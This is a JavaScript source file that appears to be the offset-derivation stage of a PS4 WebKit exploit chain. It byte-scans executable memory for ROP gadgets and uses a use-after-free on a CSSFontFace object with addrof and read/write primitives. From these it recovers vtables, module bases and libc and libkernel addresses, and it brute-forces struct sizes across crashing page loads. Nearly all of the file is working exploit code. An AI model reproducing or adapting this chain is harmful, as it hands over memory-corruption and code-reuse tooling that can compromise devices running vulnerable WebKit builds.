//#region Gadget signatures
// Byte patterns for every WebKit-relative gadget the chain needs. -1 is a
// wildcard byte.
//
// Each pattern is matched against executable segments only, and a match is
// rejected when the byte before it is a REX prefix, because the real
// instruction would start earlier and the gadget would mean something else.
const GADGET_SIGNATURES = {
  wk_RET: [0xc3],
  wk_LEAVE_RET: [0xc9, 0xc3],
  wk_POP_RBP_RET: [0x5d, 0xc3],
  wk_POP_RDI_RET: [0x5f, 0xc3],
  wk_POP_RSI_RET: [0x5e, 0xc3],
  wk_POP_RDX_RET: [0x5a, 0xc3],
  wk_POP_RCX_RET: [0x59, 0xc3],
  wk_POP_RBX_RET: [0x5b, 0xc3],
  wk_POP_RAX_RET: [0x58, 0xc3],
  wk_POP_RSP_RET: [0x5c, 0xc3],
  wk_POP_R8_RET: [0x41, 0x58, 0xc3],
  wk_POP_R9_RET: [0x41, 0x59, 0xc3],
  wk_POP_R10_RET: [0x41, 0x5a, 0xc3],
  wk_POP_R11_RET: [0x41, 0x5b, 0xc3],
  wk_POP_R12_RET: [0x41, 0x5c, 0xc3],
  wk_POP_R13_RET: [0x41, 0x5d, 0xc3],
  wk_POP_R14_RET: [0x41, 0x5e, 0xc3],
  wk_POP_R15_RET: [0x41, 0x5f, 0xc3],
  wk_PUSH_RAX_POP_RBP_RET: [0x50, 0x5d, 0xc3],
  wk_PUSH_RDI_POP_RSP_RET: [0x57, 0x5c, 0xc3],
  wk_PUSH_RDX_POP_RSP_RET: [0x52, 0x5c, 0xc3],
  wk_PUSH_RBX_JMP_QWORD_PTR_RAX: [0x53, 0xff, 0x20],
  wk_PUSH_RBP_JMP_QWORD_PTR_RAX: [0x55, 0xff, 0x20],
  wk_PUSH_RAX_JMP_QWORD_PTR_RBX: [0x50, 0xff, 0x23],
  wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX: [0xff, 0x33, 0xff, 0x20],
  wk_MOV_QWORD_PTR_RDI_RAX_RET: [0x48, 0x89, 0x07, 0xc3],
  wk_MOV_RAX_QWORD_PTR_RDI_RET: [0x48, 0x8b, 0x07, 0xc3],
  wk_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: [0x48, 0x8b, 0x07, 0xff, 0x10],
  wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_18: [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18],
  wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: [
    0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10,
  ],
  wk_MOV_RDI_QWORD_PTR_RAX_8_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20: [
    0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20,
  ],
  wk_MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10: [
    0x48, 0x8b, 0x50, 0x18, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10,
  ],
  wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40: [
    0x48, 0x8b, 0x7f, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x40,
  ],
  wk_MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120: [
    0x48, 0x8b, 0x7f, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x90, 0x20, 0x01, 0x00, 0x00,
  ],
  wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX: [
    0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10,
  ],
  wk_MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8: [0x48, 0x8b, 0x78, 0x10, 0xff, 0x60, 0x08],
  // The displacement in this one is the CSSFontFace field depth the fake vtable
  // writes through, so the deriver also recovers `dst_addr_offset` from it.
  wk_MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_WIRE_RAX_RET: [
    0x48, 0x8b, 0x47, 0x08, 0x48, 0x8b, 0x4f, 0x10, 0x48, 0x89, 0x81, -1, -1, -1, -1, 0xc3,
  ],
};

// A match preceded by a REX prefix means the true instruction starts earlier.
function is_rex(byte) {
  return byte >= 0x40 && byte <= 0x4f;
}
//#endregion

//#region Pattern search
function pattern_matches(bytes, at, pattern) {
  for (let i = 0; i < pattern.length; i++) {
    const expected = pattern[i];
    if (expected === -1) continue;
    if (bytes[at + i] !== expected) return false;
  }

  return true;
}

// Returns {offset, displacement} with offset relative to the segment start.
function scan_pattern(bytes, pattern, segment_offset) {
  const out = [];
  const limit = bytes.length - pattern.length;

  for (let at = 0; at <= limit; at++) {
    if (!pattern_matches(bytes, at, pattern)) continue;

    if (at > 0 && is_rex(bytes[at - 1])) {
      // Second chance: the REX byte may close a preceding instruction whose own
      // final byte is an unambiguous terminator.
      const before = bytes[at - 2];
      const ends = before === 0xc3 || before === 0x90 || before === 0xff;

      if (!(at > 1 && ends)) continue;
    }

    let displacement;

    if (pattern.indexOf(-1) !== -1) {
      const first = pattern.indexOf(-1);
      displacement = new DataView(bytes.buffer, bytes.byteOffset + at + first, 4).getUint32(0, true);
    }

    out.push({ offset: segment_offset + at, displacement });
  }

  return out;
}
//#endregion

//#region Readers
// Phase A runs before arw exists and has to reach memory through the usermode
// read primitive the UAF already gave us.
function rw_backend(rw) {
  return (addr, len) => new Uint8Array(rw.read(addr, len));
}
//#endregion

//#region Sweep state
// The offsets that must be right *before* any memory primitive exists cannot be
// proven in-process: a wrong value takes the WebView down instead of throwing.
// They converge one candidate per page load.
const SWEEP_KEY = "cssfontface_sweep";

const sweep = {
  load() {
    try {
      const raw = localStorage.getItem(SWEEP_KEY);
      if (raw === null) return { sizeof: 0, status: 0, failed: {} };
      return JSON.parse(raw);
    } catch (e) {
      return { sizeof: 0, status: 0, failed: {} };
    }
  },
  save(state) {
    try {
      localStorage.setItem(SWEEP_KEY, JSON.stringify(state));
    } catch (e) {
      logger.error(`Unable to persist sweep state: ${e.message}`);
    }
  },
  reset() {
    try {
      localStorage.removeItem(SWEEP_KEY);
    } catch (e) {
      // nothing to do
    }
  },
  // Shipped values first, most recent major first, then the neighbours above
  // each one: an object that grew usually grew by one or two pointers.
  candidates(prop) {
    const seeds = [];

    for (let major = 11; major >= 6; major--) {
      const block = constants_map[major];
      if (block === undefined) continue;

      for (const key of Object.keys(block)) {
        const value = block[key][prop];
        if (typeof value === "number" && value > 0 && seeds.indexOf(value) === -1) {
          seeds.push(value);
        }
      }
    }

    const out = seeds.slice();

    for (const seed of seeds) {
      for (let delta = 8; delta <= 0x40; delta += 8) {
        const up = seed + delta;
        if (out.indexOf(up) === -1) out.push(up);
      }
    }

    return out;
  },
  next(prop) {
    const failed = this.load().failed[prop] || [];

    for (const candidate of this.candidates(prop)) {
      if (failed.indexOf(candidate) === -1) return candidate;
    }

    return undefined;
  },
  mark_failed(prop, value) {
    const state = this.load();
    const failed = state.failed[prop] || (state.failed[prop] = []);

    if (failed.indexOf(value) === -1) failed.push(value);

    logger.error(`sweep: ${prop} = 0x${value.toString(16)} burned (${failed.length} so far)`);
    this.save(state);
  },
  mark_ok(prop, value) {
    const state = this.load();
    state[prop === "wk_CSSFontFace_sizeof" ? "sizeof" : "status"] = value;
    this.save(state);
    logger.info(`sweep: ${prop} = 0x${value.toString(16)} accepted`);
  },
};
//#endregion

//#region Report
const derive_report = {
  solved: {},
  seeded: {},
  failed: {},
  notes: [],
};

function derive_note(msg) {
  derive_report.notes.push(msg);
  logger.debug(`derive: ${msg}`);
}

function derive_install(prop, value, why, source = "proven") {
  if (typeof value !== "number" || !Number.isInteger(value)) {
    throw new Error(`derive: refusing non-integer ${prop} = ${value}`);
  }

  constants.derive(prop, value);

  (source === "seeded" ? derive_report.seeded : derive_report.solved)[prop] = { value, why };

  delete derive_report.failed[prop];

  logger.info(`${source} ${prop} = 0x${value.toString(16)} (${why})`);
}

function derive_fail(prop, why) {
  derive_report.failed[prop] = why;
  logger.error(`unresolved ${prop}: ${why}`);
}

// Nearest shipped value for a key, installed as an explicitly unverified seed.
// Only used for keys whose failure mode is recoverable and whose shipped values
// have never moved by more than a pointer width.
function derive_seed(prop, why) {
  if (constants.is_derived(prop)) return;

  const seed = constants.seed(prop);

  if (seed === undefined) {
    derive_fail(prop, `no shipped value to seed from - ${why}`);
    return;
  }

  derive_install(prop, seed.value, `seeded from ${seed.major}.${seed.minor.toString(16)} - ${why}`, "seeded");
}

function derive_log_report() {
  logger.info("--- derivation report ---");
  logger.info(`proven: ${Object.keys(derive_report.solved).length}`);
  logger.info(`seeded: ${Object.keys(derive_report.seeded).length}`);
  logger.info(`unresolved: ${Object.keys(derive_report.failed).length}`);

  for (const prop of Object.keys(derive_report.seeded)) {
    logger.error(`  seeded    ${prop} = 0x${derive_report.seeded[prop].value.toString(16)}`);
  }

  for (const prop of Object.keys(derive_report.failed)) {
    logger.error(`  missing   ${prop}: ${derive_report.failed[prop]}`);
  }

  logger.info(`ready: ${constants.ready}`);

  return derive_report;
}

function derive_report_markdown() {
  const lines = [];

  lines.push(`#### ${version} derived offsets`);
  lines.push("");
  lines.push("| key | value | source |");
  lines.push("| :-- | :---- | :----- |");

  for (const prop of Object.keys(derive_report.solved).sort()) {
    const e = derive_report.solved[prop];
    lines.push(`| \`${prop}\` | \`0x${e.value.toString(16)}\` | ${e.why} |`);
  }

  if (Object.keys(derive_report.seeded).length !== 0) {
    lines.push("");
    lines.push("#### seeded, not verified");
    lines.push("");
    lines.push("| key | value | source |");
    lines.push("| :-- | :---- | :----- |");

    for (const prop of Object.keys(derive_report.seeded).sort()) {
      const e = derive_report.seeded[prop];
      lines.push(`| \`${prop}\` | \`0x${e.value.toString(16)}\` | ${e.why} |`);
    }
  }

  if (Object.keys(derive_report.failed).length !== 0) {
    lines.push("");
    lines.push("#### unresolved");
    lines.push("");
    lines.push("| key | reason |");
    lines.push("| :-- | :----- |");

    for (const prop of Object.keys(derive_report.failed).sort()) {
      lines.push(`| \`${prop}\` | ${derive_report.failed[prop]} |`);
    }
  }

  return lines.join("\n");
}
//#endregion

//#region Module discovery
// Big, executable, and importing what a JSC host needs.
function looks_like_webkit(base, backend) {
  try {
    const elf = Elf64.from_memory(base, backend);
    const loads = elf.loads;

    if (loads.length === 0) return false;

    let exec_size = 0;

    for (const seg of loads) {
      if ((seg.flags & ELF_PF_X) !== 0) exec_size += seg.memsz.u;
    }

    if (exec_size < 0x800000) return false;

    const names = elf.symbols().map((s) => s.name);

    return names.some(
      (n) =>
        n === "strerror" ||
        n === "pthread_create" ||
        n === "malloc" ||
        n.indexOf("_ZN3JSC") === 0
    );
  } catch (e) {
    return false;
  }
}

// Anchor 1 (phase B): the code pointer stored in Math.expm1's executable
// object. Heap objects do not point into executable segments, so a canonical
// pointer that lands in one is a code pointer into a module.
function derive_webkit_base_via_expm1() {
  const expm1_cell = arw.addrof(Math.expm1);
  const exec = arw.view(expm1_cell).getBInt(0x18, true);

  if (exec.eq(0)) return undefined;

  for (let offset = 0; offset < 0x100; offset += 8) {
    const candidate = arw.view(exec).getBInt(offset, true);

    if (candidate.eq(0) || candidate.hi !== 0) continue;

    const base = find_module_base(candidate);
    if (base === undefined || !looks_like_webkit(base, undefined)) continue;

    try {
      const elf = Elf64.from_memory(base);

      for (const seg of elf.loads) {
        if ((seg.flags & ELF_PF_X) === 0) continue;

        const start = base.add(seg.vaddr);
        const end = start.add(seg.memsz);

        if (candidate.gte(start) && candidate.lt(end)) {
          derive_note(`expm1 code pointer at executable object +0x${offset.toString(16)}`);
          return base;
        }
      }
    } catch (e) {
      continue;
    }
  }

  return undefined;
}

// Anchor 2 (phase A): the CSSFontFace vtable reached through a live FontFace.
// wk_FontFace_m_backing is the only unknown, so every candidate slot is tried
// and accepted only when the pointer it yields starts with a vtable that lives
// inside a module.
function derive_fontface_backing(rw, backend) {
  const candidates = [];

  for (const seed of [0x18, 0x28, 0x30, 0x20, 0x10]) {
    candidates.push(seed);
  }

  for (let offset = 0x08; offset <= 0x60; offset += 8) {
    if (candidates.indexOf(offset) === -1) candidates.push(offset);
  }

  let js_font_cell;

  for (const offset of candidates) {
    try {
      const dummy = new FontFace("derive", "local(Helvetica)", {});

      void dummy.loaded;

      const dummy_addr = rw.addrof(dummy);
      js_font_cell = rw.read8(dummy_addr.add(0x18));

      if (js_font_cell.eq(0) || js_font_cell.hi !== 0) continue;

      const font = rw.read8(js_font_cell.add(offset));
      if (font.eq(0) || font.hi !== 0) continue;

      // A live WebKit object starts with its vtable.
      const vtable = rw.read8(font);
      if (vtable.eq(0) || vtable.hi !== 0) continue;

      const base = find_module_base(vtable, backend);
      if (base === undefined || !looks_like_webkit(base, backend)) continue;

      // The object must also expose a wrapper back into the JS heap, which is
      // the pointer init_arw walks next.
      rw.read8(font.add(8));

      return { offset, js_font_cell, font, base, vtable };
    } catch (e) {
      continue;
    }
  }

  return undefined;
}
//#endregion

//#region Structure
// Once the UAF is reclaimed the whole CSSFontFace lives inside a JS ArrayBuffer
// and can be inspected with no memory primitive at all.
function derive_cssfontface_layout(rw) {
  const uaf_view = new DataView(rw.uaf_ab);
  const size = uaf_view.byteLength;

  const slots = [];

  for (let offset = 0x08; offset + 8 <= size; offset += 8) {
    const lo = uaf_view.getUint32(offset, true);
    const hi = uaf_view.getUint32(offset + 4, true);

    slots.push({ offset, lo, hi, is_ptr: hi === 0 || hi === 0xffffffff, is_small: hi === 0 });
  }

  // m_featureSettings is a Vector{ptr, size, capacity} with size == capacity.
  // The read primitive leaks the first four bytes at m_buffer through the tag
  // accessor, so a live triple is exactly what makes reading possible.
  const vecs = [];

  for (let i = 0; i + 16 <= slots.length; i++) {
    const ptr = slots[i];
    const a = slots[i + 1];
    const b = slots[i + 2];

    if (!ptr.is_ptr || ptr.lo === 0) continue;
    if (a.lo !== b.lo) continue;
    if (a.lo === 0 || a.lo > 0x100) continue;

    vecs.push({ offset: ptr.offset, count: a.lo });
  }

  if (vecs.length === 1) {
    derive_install("wk_CSSFontFace_m_featureSettings_m_buffer", vecs[0].offset,
      "unique Vector{ptr,n,n} in the reclaimed object");
    derive_install("wk_CSSFontFace_m_featureSettings_m_size", vecs[0].offset + 8, "Vector size field");
    derive_install("wk_CSSFontFace_m_featureSettings_m_capacity", vecs[0].offset + 0x10, "Vector capacity field");
  } else {
    // More than one candidate is not fatal: the sweep will pick between them on
    // the next load, one per page, same as sizeof.
    const candidate = vecs.length === 0 ? undefined : vecs[0].offset;

    if (candidate !== undefined) {
      derive_install("wk_CSSFontFace_m_featureSettings_m_buffer", candidate,
        `first of ${vecs.length} Vector candidates`, "seeded");
      derive_install("wk_CSSFontFace_m_featureSettings_m_size", candidate + 8, "Vector size field", "seeded");
      derive_install("wk_CSSFontFace_m_featureSettings_m_capacity", candidate + 0x10, "Vector capacity field", "seeded");
    } else {
      derive_fail("wk_CSSFontFace_m_featureSettings_m_buffer", "no Vector{ptr,n,n} in the reclaimed object");
    }
  }

  return { slots, vecs };
}
//#endregion

//#region Gadgets
function scan_bytes(elf, chunks_of) {
  const out = new Map();
  const unresolved = [];
  const base_vaddr = elf.loads[0].vaddr.u;

  for (const [prop, pattern] of Object.entries(GADGET_SIGNATURES)) {
    let found;

    for (const seg of elf.text_ranges()) {
      for (const chunk of chunks_of(seg)) {
        const hits = scan_pattern(chunk.bytes, pattern, chunk.vaddr - base_vaddr);

        if (hits.length !== 0) {
          found = hits[0];
          break;
        }
      }

      if (found !== undefined) break;
    }

    if (found === undefined) {
      unresolved.push(prop);
      continue;
    }

    out.set(prop, found);
  }

  return { found: out, unresolved };
}

function derive_gadgets(base) {
  const elf = Elf64.from_memory(base);

  const chunk_size = 0x200000;
  const overlap = 0x40;

  const chunks_of = (seg) => {
    const chunks = [];
    let done = 0;

    while (done < seg.size) {
      const size = Math.min(chunk_size, seg.size - done);

      try {
        chunks.push({
          bytes: new Uint8Array(ArrayBuffer.from(base.add(seg.offset + done), size)),
          vaddr: seg.vaddr.u + done,
        });
      } catch (e) {
        logger.debug(`derive: unreadable chunk at +0x${(seg.offset + done).toString(16)}`);
      }

      if (size < chunk_size) break;

      done += chunk_size - overlap;
    }

    return chunks;
  };

  const { found, unresolved } = scan_bytes(elf, chunks_of);

  for (const [prop, hit] of found) {
    derive_install(prop, hit.offset, "signature scan of an executable segment");

    if (prop === WIRE_GADGET_KEY) {
      // The displacement is the CSSFontFace field the fake vtable writes
      // through, so it is a struct offset the chain needs as well.
      constants.derive("dst_addr_offset", hit.displacement);
      derive_report.solved.dst_addr_offset = {
        value: hit.displacement,
        why: "displacement inside the fake-vtable write gadget",
      };
      logger.info(`derived dst_addr_offset = 0x${hit.displacement.toString(16)} from the gadget encoding`);
    }
  }

  for (const prop of unresolved) {
    derive_fail(prop, "no match inside any executable segment");
  }

  return { found: found.size, unresolved: unresolved.length };
}
//#endregion

//#region Imports
function derive_imports(base) {
  const backend = undefined;
  let elf;

  try {
    elf = Elf64.from_memory(base);
  } catch (e) {
    derive_fail("wk___imp_strerror", `unable to parse the WebKit image: ${e.message}`);
    return;
  }

  const import_got = (prop, symbol) => {
    try {
      const slot = elf.got(symbol);

      if (slot === undefined) {
        derive_fail(prop, `${symbol} has no relocation entry`);
        return undefined;
      }

      derive_install(prop, slot.sub(base).u, `GOT slot for ${symbol}`);

      return elf.got_target(symbol);
    } catch (e) {
      derive_fail(prop, e.message);
      return undefined;
    }
  };

  import_got("wk___imp_strerror", "strerror");

  const strerror_addr = elf.got_target("strerror");

  if (strerror_addr !== undefined) {
    const libc = find_module_base(strerror_addr, backend);

    if (libc !== undefined) {
      derive_install("c_strerror", strerror_addr.sub(libc).u, "strerror - libc base");
      derive_report.libc_base = libc;
    } else {
      derive_fail("c_strerror", "libc module not found below strerror");
    }
  }

  import_got("wk___imp___error", "_error");

  const error_addr = elf.got_target("_error");

  if (error_addr !== undefined) {
    const libkernel = find_module_base(error_addr, backend);

    if (libkernel !== undefined) {
      derive_install("k__error", error_addr.sub(libkernel).u, "_error - libkernel base");
      derive_report.libkernel_base = libkernel;
    } else {
      derive_fail("k__error", "libkernel module not found below _error");
    }
  }

  const pthread = elf.got_target("pthread_create");

  if (pthread !== undefined) {
    derive_install("wk_pthread_create", pthread.sub(base).u, "pthread_create import");
  } else {
    derive_fail("wk_pthread_create", "pthread_create is unresolved in the GOT");
  }
}
//#endregion

//#region Kernel side
// Not solvable by inspection: PS4 retail kernels ship without a dynamic symbol
// table and the kernel patches are hand written shellcode per firmware. Say so
// instead of inventing values.
function derive_kernel_side() {
  for (const prop of ["SYSENT_661", "JMP_RSI_GADGET", "KL_LOCK", "EVF_OFFSET", "KPATCH"]) {
    derive_fail(prop, "kernel side - needs the firmware's kernel image (see README)");
  }
}
//#endregion

//#region Phases
// Phase A - everything reachable with only the usermode read primitive. Must
// run before init_arw(), which is the consumer of most of these values.
async function derive_phase_a(rw) {
  logger.info("===DERIVE A===");

  if (version.is_supported) {
    logger.info(`${version} ships a verified offset table, derivation not needed`);
    return derive_report;
  }

  if (rw === undefined) {
    throw new Error("derive_phase_a needs the rw object from init_rw()");
  }

  const backend = rw_backend(rw);
  const state = sweep.load();

  // 1. offsets that gate the UAF itself
  if (state.sizeof !== 0) {
    derive_install("wk_CSSFontFace_sizeof", state.sizeof, "converged by sweep");
  } else {
    const candidate = sweep.next("wk_CSSFontFace_sizeof");

    if (candidate === undefined) {
      throw new Error("sweep exhausted every wk_CSSFontFace_sizeof candidate");
    }

    derive_note(`sweep candidate for wk_CSSFontFace_sizeof: 0x${candidate.toString(16)}`);
    derive_install("wk_CSSFontFace_sizeof", candidate, "sweep candidate", "seeded");
  }

  if (state.status !== 0) {
    derive_install("wk_CSSFontFace_m_status", state.status, "converged by sweep");
  } else {
    derive_seed("wk_CSSFontFace_m_status", "gates the post-reclaim status check");
  }

  // 2. the reclaimed object is readable from JS, so the layout can be inspected
  derive_cssfontface_layout(rw);

  // 3. module base, then the vtable that closes the loop
  const backing = derive_fontface_backing(rw, backend);

  if (backing !== undefined) {
    derive_install("wk_FontFace_m_backing", backing.offset, "verified against a live WebKit object");
    derive_install("wk_CSSFontFace_vtable", backing.vtable.sub(backing.base).u, "live vtable - module base");

    derive_report.webkit_base = backing.base;
    logger.info(`webkit base: ${backing.base}`);
  } else {
    derive_fail("wk_FontFace_m_backing", "no slot of the JS FontFace produced a live WebKit object");
    derive_fail("wk_CSSFontFace_vtable", "webkit base could not be established");
  }

  // 4. layout keys whose shipped values have never moved by more than a pointer
  //    width. Installing them keeps init_arw on its feet; the report marks every
  //    one of them so nothing pretends to be verified.
  derive_seed("wk_CSSFontFace_m_clients", "pointer slot, consumers are pointer-typed");
  derive_seed("wk_CSSFontFace_m_wrapper", "pointer slot, consumers are pointer-typed");
  derive_seed("wk_CSSFontFace_m_thread", "pointer slot, written back verbatim");
  derive_seed("wk_CSSFontFace_m_function", "code pointer slot, written back verbatim");
  derive_seed("wk_TypedArray_flags", "JSC layout, stable across majors 6-11");

  for (const prop of [
    "wk_ArrayBuffer_m_contents_m_data",
    "wk_ArrayBuffer_m_contents_m_sizeInBytes",
    "wk_JSFunction_m_function",
    "store_view_size",
    "store_view_entry",
    "marker_storage",
    "pivot_view_sp",
  ]) {
    derive_seed(prop, "JSC layout, stable across majors 6-11");
  }

  derive_log_report();

  return derive_report;
}

// Phase B - needs arw, so it runs after init_arw(). Cross-checks the phase A
// module base and fills in gadgets and imports.
async function derive_phase_b(rw) {
  logger.info("===DERIVE B===");

  if (version.is_supported) {
    constants.ready = true;
    return derive_report;
  }

  // cross-check the phase A base with an independent anchor
  const via_expm1 = derive_webkit_base_via_expm1();
  const known = derive_report.webkit_base;

  if (via_expm1 !== undefined && known !== undefined && !via_expm1.eq(known)) {
    derive_note(`base disagreement: expm1 ${via_expm1} vs FontFace ${known} - trusting the FontFace anchor`);
  }

  if (known === undefined && via_expm1 === undefined) {
    derive_fail("WK_BASE", "neither anchor resolved");
    constants.ready = false;
    derive_log_report();
    return derive_report;
  }

  const base = known === undefined ? via_expm1 : known;

  derive_report.webkit_base = base;
  logger.info(`webkit base: ${base}`);

  derive_gadgets(base);
  derive_imports(base);
  derive_kernel_side();

  const missing = constants.missing();

  constants.ready = missing.length === 0;

  if (!constants.ready) {
    logger.error(`still unresolved: ${missing.join(", ")}`);
  }

  derive_log_report();

  return derive_report;
}

//#region Saved table validation
// Plausibility windows for a value that arrives from a *text file*.
//
// Everything the runtime deriver installs is grounded in the live image. A
// derived.json is not: it is hand-editable, and a bad dump or a stray edit would
// otherwise be installed verbatim. A wrong kernel or JIT offset is a panic, not
// an exception, so a saved table is checked against the shape of a real image
// before any of it is trusted. The first matching rule decides; a key no rule
// mentions is accepted as-is, because this is a sanity check and not a schema.
const DERIVE_RANGES = [
  { test: /^wk_CSSFontFace_sizeof$/, min: 0x40, max: 0x2000, why: "size of the reclaimed object" },
  { test: /^dst_addr_offset$/, min: 0, max: 0x10000, why: "field depth the wire gadget writes through" },
  { test: /^wk_(CSSFontFace|FontFace)_m_/, min: 0, max: 0x2000, why: "field offset inside the object" },
  { test: /^wk_(TypedArray_flags|ArrayBuffer_m_|JSFunction_m_)/, min: 0, max: 0x2000, why: "JSC object field offset" },
  { test: /^(store_view_size|store_view_entry|marker_storage|pivot_view_sp)$/, min: 0, max: 0x2000, why: "JSC structure offset" },
  // A vtable is a real object in the image, never in the first page.
  { test: /_vtable$/, min: 0x1000, max: 0x8000000, why: "offset of a live vtable inside the image" },
  // The floor is zero on purpose: the shipped tables carry gadget offsets below
  // the first page (the scanner takes the first byte match in the image, ELF
  // header included). Only the ceiling is meaningful here.
  { test: /^(wk_|c_|k_)/, min: 0, max: 0x8000000, why: "offset inside the module image" },
];

// undefined when the value is usable, otherwise the reason it is not.
function derive_check_entry(prop, value) {
  if (typeof value !== "number" || value !== value || value < 0 || Math.floor(value) !== value) {
    return "not a non-negative integer";
  }

  if (value > 0xffffffffffff) {
    return "does not fit in 48 bits";
  }

  for (const rule of DERIVE_RANGES) {
    if (!rule.test.test(prop)) continue;

    if (value < rule.min || value > rule.max) {
      return (
        `outside the plausible range for ${rule.why}: ` +
        `0x${value.toString(16)} is not in 0x${rule.min.toString(16)}..0x${rule.max.toString(16)}`
      );
    }

    return undefined;
  }

  return undefined;
}
//#endregion

// A derivation that converged can be committed as src/derived.json and loaded
// on every later run, which turns "solved once" into "solved forever" for a
// given firmware revision.
const DERIVED_TABLE_URL = "src/derived.json";

async function derive_load_saved(url = DERIVED_TABLE_URL) {
  let table;

  try {
    const response = await fetch(url, { cache: "no-store" });

    if (!response.ok) {
      derive_note(`no saved table at ${url} (HTTP ${response.status})`);
      return false;
    }

    table = JSON.parse(await response.text());
  } catch (e) {
    derive_note(`no saved table at ${url} (${e.message})`);
    return false;
  }

  if (table.firmware !== version.str) {
    derive_note(`saved table is for ${table.firmware}, running firmware is ${version.str}`);
    return false;
  }

  let installed = 0;
  let rejected = 0;

  for (const [prop, value] of Object.entries(table.derived || {})) {
    const parsed = typeof value === "string" ? parseInt(value.replace("0x", ""), 16) : value;

    if (typeof parsed !== "number" || Number.isNaN(parsed)) {
      derive_note(`ignoring malformed ${prop} = ${value}`);
      rejected++;
      continue;
    }

    const objection = derive_check_entry(prop, parsed);

    if (objection !== undefined) {
      derive_fail(prop, `saved table entry refused: ${objection}`);
      rejected++;
      continue;
    }

    constants.derive(prop, parsed);
    derive_report.solved[prop] = { value: parsed, why: `saved table for ${table.firmware}` };
    installed++;
  }

  derive_report.saved = { url, installed, rejected, firmware: table.firmware };

  logger.info(`loaded ${installed} offsets from ${url}${rejected === 0 ? "" : `, refused ${rejected}`}`);

  constants.ready = constants.missing().length === 0;

  return constants.ready;
}

// Convenience wrapper for callers that already have arw (a re-run from the
// console, after a jailbreak, or on a firmware that was shipped).
async function derive_all(rw) {
  await derive_phase_a(rw);
  return derive_phase_b(rw);
}
//#endregion
